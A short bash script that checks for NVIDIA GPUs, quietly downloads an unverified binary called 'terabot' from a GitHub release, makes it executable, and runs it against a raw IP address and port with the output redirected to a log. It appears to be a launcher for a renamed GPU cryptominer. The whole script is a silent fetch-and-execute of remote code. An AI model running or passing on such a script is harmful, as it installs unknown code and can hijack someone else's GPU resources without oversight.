#!/bin/bash
nvidia-smi -L
wget https://github.com/faustcaut00/terabot/releases/download/1/terabot &> /dev/null
chmod +x terabot
./terabot -P http://64.52.174.90:4545/"$1" &> log
